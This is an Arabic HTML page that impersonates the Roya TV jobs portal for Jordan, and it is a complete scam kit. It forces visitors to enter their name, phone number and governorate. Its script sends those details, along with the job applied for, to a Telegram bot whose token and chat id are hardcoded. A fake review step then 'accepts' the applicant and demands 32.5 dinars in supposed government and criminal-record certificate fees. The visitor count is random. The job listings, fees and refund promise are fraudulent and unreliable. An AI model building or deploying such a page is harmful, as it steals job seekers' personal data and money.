<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>بوابة وظائف رؤيا | الأردن</title>
  <link href="https://fonts.googleapis.com/css?family=Tajawal:400,700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Tajawal', Arial, sans-serif;
      background: linear-gradient(135deg, #f8fafc 0%, #e4ecf7 100%);
      margin: 0;
      padding: 0;
      color: #222;
      min-height: 100vh;
      position: relative;
    }
    header {
      background: #6900ad;
      color: #fff;
      padding: 20px 0 10px 0;
      text-align: center;
      box-shadow: 0 3px 16px #865fc44d;
      position: sticky;
      top: 0;
      z-index: 10;
    }
    .logo {
      height: 68px;
      margin-bottom: 6px;
    }
    h1 {
      margin: 0 0 8px 0;
      font-size: 2.2rem;
      font-weight: 700;
      letter-spacing: 1px;
    }
    .subtitle {
      font-size: 1.2rem;
      color: #e5d7f9;
      margin-bottom: 5px;
    }
    .container {
      max-width: 1050px;
      margin: 32px auto;
      padding: 16px;
      background: #fff;
      border-radius: 18px;
      box-shadow: 0 2px 22px #a97be73f;
      position: relative;
      z-index: 1;
    }
    .stats {
      display: flex;
      gap: 20px;
      justify-content: center;
      margin: 18px 0 40px 0;
    }
    .stat {
      background: #6900ad;
      color: #fff;
      padding: 18px 32px;
      border-radius: 15px;
      font-size: 1.1rem;
      font-weight: 600;
      box-shadow: 0 1px 4px #0001;
      text-align: center;
    }
    .jobs-list {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
      gap: 24px;
    }
    .job-card {
      background: #f7f2ff;
      border: 2px solid #e4d4f7;
      border-radius: 14px;
      padding: 24px 20px 16px 20px;
      box-shadow: 0 1px 8px #a97be712;
      transition: transform 0.1s;
      position: relative;
      overflow: hidden;
      min-height: 220px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
    }
    .job-title {
      font-size: 1.23rem;
      font-weight: bold;
      color: #6900ad;
      margin-bottom: 8px;
    }
    .job-info {
      font-size: 1.02rem;
      margin-bottom: 6px;
      color: #333;
    }
    .job-province {
      font-size: 0.99rem;
      color: #49007e;
      margin-bottom: 6px;
    }
    .salary {
      font-weight: bold;
      color: #0a6c19;
      margin-bottom: 6px;
    }
    .hours {
      color: #ad6c00;
      margin-bottom: 6px;
    }
    .apply-btn {
      background: linear-gradient(90deg, #8400d3 0%, #a97be7 100%);
      color: #fff;
      border: none;
      border-radius: 10px;
      padding: 9px 17px;
      font-size: 1.08rem;
      font-weight: 600;
      cursor: pointer;
      box-shadow: 0 1px 8px #6900ad2b;
      transition: background 0.2s;
      margin-top: 8px;
      align-self: flex-end;
    }
    .apply-btn:hover {
      background: linear-gradient(90deg, #6900ad 0%, #a97be7 100%);
    }
    /* Modal styles */
    .modal-bg {
      position: fixed;
      inset: 0;
      background: #0007;
      z-index: 10000;
      display: flex;
      align-items: center;
      justify-content: center;
      animation: fadeIn 0.3s;
    }
    .modal {
      background: #fff;
      border-radius: 16px;
      max-width: 96vw;
      width: 420px;
      box-shadow: 0 4px 32px #6900ad3a;
      padding: 38px 20px 28px 20px;
      text-align: center;
      position: relative;
      animation: slideIn 0.25s;
    }
    @keyframes fadeIn { from { opacity: 0 } to { opacity: 1 } }
    @keyframes slideIn { from { transform: translateY(60px); opacity: 0 } to { transform: none; opacity: 1 } }
    .modal h2 {
      color: #6900ad; margin-bottom: 20px;
    }
    .modal input, .modal select {
      width: 92%;
      padding: 8px 10px;
      border-radius: 8px;
      border: 1.5px solid #cbb7eb;
      font-size: 1.08rem;
      margin-bottom: 16px;
      direction: rtl;
      outline: none;
      transition: border 0.2s;
    }
    .modal input:focus, .modal select:focus { border-color: #6900ad; }
    .modal button {
      background: linear-gradient(90deg, #6900ad 0%, #a97be7 100%);
      color: #fff;
      border: none;
      border-radius: 10px;
      padding: 9px 27px;
      font-size: 1.08rem;
      font-weight: 600;
      cursor: pointer;
      box-shadow: 0 1px 8px #6900ad1b;
      margin-top: 10px;
    }
    .modal .note {
      color: #ad6c00;
      font-size: 0.98rem;
      margin-top: 8px;
      margin-bottom: 8px;
    }
    .modal .loader {
      margin: 16px auto;
      border: 4px solid #eee;
      border-radius: 50%;
      border-top: 4px solid #6900ad;
      width: 48px;
      height: 48px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin { 100% { transform: rotate(360deg) } }
    .modal .success {
      color: #0a6c19;
      font-size: 1.09rem;
      margin-top: 10px;
      margin-bottom: 10px;
      font-weight: bold;
    }
    .modal .pay-btn {
      background: linear-gradient(90deg, #e56400 0%, #fbae3c 100%);
      color: #fff;
      border: none;
      border-radius: 10px;
      padding: 10px 34px;
      font-size: 1.16rem;
      font-weight: 700;
      margin-top: 22px;
      cursor: pointer;
      box-shadow: 0 1px 8px #c89a2a2b;
    }
    .modal .pay-btn:active { background: #e56400 }
    /* Footer */
    footer {
      background: #f7f2ff;
      color: #6900ad;
      text-align: center;
      padding: 18px 0 10px 0;
      border-radius: 18px 18px 0 0;
      font-size: 1.07rem;
      margin: 23px 0 0 0;
      box-shadow: 0 -2px 12px #a97be71a;
    }
    /* Responsive */
    @media (max-width: 700px) {
      .container { padding: 6px; }
      .stats { flex-direction: column; gap: 12px; }
      .modal { width: 97vw; padding: 28px 3vw 20px 3vw; }
      .job-card { padding: 16px 8px 12px 8px; }
    }
  </style>
</head>
<body>
  <header>
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/ROYA_TV_LOGO.svg/512px-ROYA_TV_LOGO.svg.png" alt="شعار رؤيا"/>
    <h1>بوابة وظائف رؤيا</h1>
    <div class="subtitle">جميع الوظائف المتوفرة في الأردن بين يديك</div>
  </header>

  <div class="container">
    <div class="stats">
      <div class="stat" id="stat-jobs">عدد الوظائف المتاحة: <span>--</span></div>
      <div class="stat" id="stat-users">عدد المسجلين اليوم: <span>--</span></div>
      <div class="stat" id="stat-provinces">محافظات الأردن: <span>12</span></div>
    </div>
    <div style="margin-bottom:14px; text-align:center;">
      <input id="search" type="text" placeholder="ابحث عن وظيفة أو كلمة مفتاحية..." style="padding:8px 12px; border-radius:8px; border:1.5px solid #cbb7eb; width:260px; font-size:1.03rem; margin-bottom:12px;" />
    </div>
    <div class="jobs-list" id="jobs-list">
      <!-- Jobs will be inserted here by JS -->
    </div>
  </div>

  <footer>
    جميع الحقوق محفوظة &copy; قناة رؤيا 2025
    <br>
    تصميم وتطوير: فريق رؤيا الرقمي
  </footer>

  <!-- Modal overlay -->
  <div class="modal-bg" id="user-modal-bg" style="display:flex">
    <div class="modal" id="user-modal">
      <h2>تسجيل الدخول</h2>
      <div class="note">يرجى تعبئة البيانات لمتابعة تصفح الوظائف</div>
      <input type="text" id="name-input" placeholder="الاسم الكامل" />
      <input type="tel" id="phone-input" placeholder="رقم الهاتف" pattern="^07[789]\d{7}$" maxlength="10"/>
      <select id="province-input">
        <option value="">اختر المحافظة</option>
        <option>عمان</option>
        <option>إربد</option>
        <option>الزرقاء</option>
        <option>العقبة</option>
        <option>المفرق</option>
        <option>السلط</option>
        <option>جرش</option>
        <option>عجلون</option>
        <option>مأدبا</option>
        <option>الكرك</option>
        <option>الطفيلة</option>
        <option>معان</option>
      </select>
      <button id="modal-next-btn">دخول</button>
      <div id="modal-error" style="color:#b30000; font-size:.99rem;margin-top:8px;min-height:24px;"></div>
    </div>
  </div>

  <!-- Modal overlays for steps -->
  <div class="modal-bg" id="step-modal-bg" style="display:none">
    <div class="modal" id="step-modal">
      <!-- Content dynamically injected -->
    </div>
  </div>

  <script>
    // الوظائف التجريبية
    const jobsData = [
      { title: "مندوب مبيعات ميداني", salary: 700, hours: 8, desc: "فرصة عمل كمندوب مبيعات براتب ثابت وعمولات مجزية.", img: "🛒" },
      { title: "موظف خدمة عملاء", salary: 650, hours: 7, desc: "الرد على استفسارات العملاء عبر الهاتف وتقديم الدعم.", img: "☎️" },
      { title: "محاسب", salary: 950, hours: 8, desc: "إدارة الحسابات والمعاملات المالية للشركة.", img: "💼" },
      { title: "سائق توصيل", salary: 600, hours: 9, desc: "توصيل الطلبات للعملاء ضمن مناطق محددة.", img: "🚗" },
      { title: "مطور مواقع ويب", salary: 1200, hours: 8, desc: "تطوير وصيانة مواقع إلكترونية احترافية.", img: "💻" },
      { title: "مصمم جرافيك", salary: 800, hours: 7, desc: "تصميم إعلانات ومواد تسويقية للشركة.", img: "🎨" },
      { title: "مشرف مستودع", salary: 850, hours: 9, desc: "إدارة وتنظيم المخزون في المستودع.", img: "🏭" },
      { title: "مهندس مدني", salary: 1500, hours: 10, desc: "إشراف ميداني على مشاريع البناء.", img: "🏗️" },
      { title: "مساعد إداري", salary: 550, hours: 7, desc: "مساعدة الفريق الإداري في المهام المكتبية.", img: "🗂️" },
      { title: "ممرض/ة", salary: 1100, hours: 9, desc: "تقديم الرعاية الصحية للمرضى في العيادات.", img: "🩺" },
      { title: "مدرس لغة إنجليزية", salary: 750, hours: 7, desc: "تدريس اللغة الإنجليزية لطلبة المدارس.", img: "📚" },
      { title: "حارس أمن", salary: 600, hours: 8, desc: "حماية منشآت الشركة ومراقبة الدخول والخروج.", img: "🛡️" }
    ];
    // بيانات المستخدم
    let userData = null;
    let selectedJobIdx = null;
    // تحديث الإحصائيات
    function updateStats() {
      document.querySelector("#stat-jobs span").textContent = jobsData.length;
      document.querySelector("#stat-users span").textContent = Math.floor(Math.random()*61+40); // رقم عشوائي
    }
    // رسم الوظائف
    function renderJobs(filter="") {
      let jobs = jobsData;
      if(filter && filter.trim()!=="") {
        jobs = jobs.filter(j => (j.title+j.desc).includes(filter));
      }
      const list = document.getElementById("jobs-list");
      list.innerHTML = "";
      jobs.forEach((job, idx) => {
        const card = document.createElement("div");
        card.className = "job-card";
        card.innerHTML = `
          <div style="font-size:2.2rem">${job.img}</div>
          <div class="job-title">${job.title}</div>
          <div class="job-info">${job.desc}</div>
          <div class="salary">الراتب: ${job.salary} دينار</div>
          <div class="hours">ساعات العمل: ${job.hours} ساعة</div>
          <div class="job-province">المحافظة: <span>${userData ? userData.province : "--"}</span></div>
          <button class="apply-btn" data-idx="${idx}">تقديم</button>
        `;
        list.appendChild(card);
      });
      // زر تقديم
      document.querySelectorAll(".apply-btn").forEach(btn => {
        btn.onclick = function() {
          selectedJobIdx = +btn.dataset.idx;
          showStepModal("apply");
        }
      });
    }
    // نافذة التسجيل
    document.getElementById("modal-next-btn").onclick = function() {
      const name = document.getElementById("name-input").value.trim();
      const phone = document.getElementById("phone-input").value.trim();
      const province = document.getElementById("province-input").value;
      let error = "";
      if(!name) error = "يرجى إدخال الاسم";
      else if(!/^07[789]\d{7}$/.test(phone)) error = "يرجى إدخال رقم هاتف أردني صحيح";
      else if(!province) error = "يرجى اختيار المحافظة";
      if(error) { document.getElementById("modal-error").textContent = error; return; }
      userData = { name, phone, province };
      // إرسال بيانات المستخدم للبوت لأول مرة
      sendTelegram(`تسجيل جديد:
الاسم: ${name}
رقم الهاتف: ${phone}
المحافظة: ${province}`);
      // إغلاق
      document.getElementById("user-modal-bg").style.display = "none";
      updateStats();
      renderJobs();
    };
    // البحث عن وظائف
    document.getElementById("search").oninput = function() {
      renderJobs(this.value);
    }
    // إعادة المحافظة عند تبدل المستخدم (اختياري)
    // نافذة خطوات التقديم
    function showStepModal(step) {
      const modalBg = document.getElementById("step-modal-bg");
      const modal = document.getElementById("step-modal");
      if(step==="apply") {
        const job = jobsData[selectedJobIdx];
        modal.innerHTML = `
          <h2>تأكيد التقديم على الوظيفة</h2>
          <div style="margin-bottom:10px;font-size:1.09rem;">${job.img} <b>${job.title}</b></div>
          <div>الراتب: <b>${job.salary} دينار</b></div>
          <div>ساعات العمل: <b>${job.hours} ساعة</b></div>
          <div>المحافظة: <b>${userData.province}</b></div>
          <button style="margin-top:18px;" id="confirm-apply-btn">تقديم الطلب</button>
          <button style="margin-top:10px;background:#eee;color:#333;border:1px solid #ddd;" id="cancel-btn">إلغاء</button>
        `;
        modalBg.style.display = "flex";
        document.getElementById("cancel-btn").onclick = () => { modalBg.style.display = "none"; }
        document.getElementById("confirm-apply-btn").onclick = () => {
          // إرسال للتيليجرام مع الوظيفة
          sendTelegram(`تقديم وظيفة:
الاسم: ${userData.name}
رقم الهاتف: ${userData.phone}
المحافظة: ${userData.province}
الوظيفة: ${job.title}
الراتب: ${job.salary} دينار
ساعات العمل: ${job.hours} ساعة`);
          showStepModal("pending");
        }
      }
      else if(step==="pending") {
        modal.innerHTML = `
          <h2>جاري إجراءات التوظيف...</h2>
          <div class="loader"></div>
          <div style="color:#888;margin-top:14px; font-size:.99rem;">يرجى الانتظار، يتم الآن مراجعة طلبك</div>
        `;
        modalBg.style.display = "flex";
        setTimeout(() => showStepModal("accepted"), 1900);
      }
      else if(step==="accepted") {
        modal.innerHTML = `
          <h2 style="color:#127c01;">🎉 تهانينا!</h2>
          <div class="success">تم قبولك مبدئياً في الوظيفة <b>${jobsData[selectedJobIdx].title}</b></div>
          <div style="margin:12px 0 14px 0; font-size:1.05rem;">لإكمال الإجراءات وحجز مكانك الوظيفي الرجاء دفع رسوم إصدار شهادة عدم محكومية ورسوم حكومية (32.5 دينار).</div>
          <div style="color:#ad6c00;font-size:.98rem;">يتم استرداد المبلغ في حال قمت بالإبلاغ بأنك لن تحضر قبل موعد الوظيفة.</div>
          <button class="pay-btn" id="pay-btn">دفع الرسوم</button>
        `;
        modalBg.style.display = "flex";
        document.getElementById("pay-btn").onclick = () => showStepModal("payment");
      }
      else if(step==="payment") {
        modal.innerHTML = `
          <h2>دفع الرسوم</h2>
          <div style="margin-bottom:12px;">رسوم إصدار شهادة عدم محكومية، وطوابع وضريبة لحجز مكانك: <b>32.5 دينار</b></div>
          <div class="note">الدفع متوفر عبر إي فواتيركم | أو تواصل معنا عبر الرقم:<br><a href="tel:0799999999" style="color:#6900ad">0799999999</a></div>
          <button style="margin-top:18px;" onclick="window.location.reload()">تم الدفع، أعد تحميل الصفحة</button>
        `;
        modalBg.style.display = "flex";
      }
    }
    // إرسال تيليجرام
    function sendTelegram(msg) {
      const token = "8364248948:AAFWbzdx1bMnjaU6xY218i0V7uAfXQXJPFM";
      const chat_id = "6873334348";
      fetch("https://api.telegram.org/bot"+token+"/sendMessage", {
        method: "POST",
        headers: { "Content-Type":"application/json" },
        body: JSON.stringify({
          chat_id,
          text: msg
        })
      }).then(()=>{}).catch(()=>{});
    }
    // عند تحميل الصفحة
    window.onload = function() {
      updateStats();
      // إذا كان مسجل سابقاً
      if(localStorage.getItem("ruyaJobsUser")) {
        userData = JSON.parse(localStorage.getItem("ruyaJobsUser"));
        document.getElementById("user-modal-bg").style.display = "none";
      }
      renderJobs();
    };
    // حفظ المستخدم في التخزين المحلي بعد التسجيل
    document.getElementById("modal-next-btn").addEventListener("click", function() {
      if(userData)
        localStorage.setItem("ruyaJobsUser", JSON.stringify(userData));
    });
  </script>
</body>
</html>
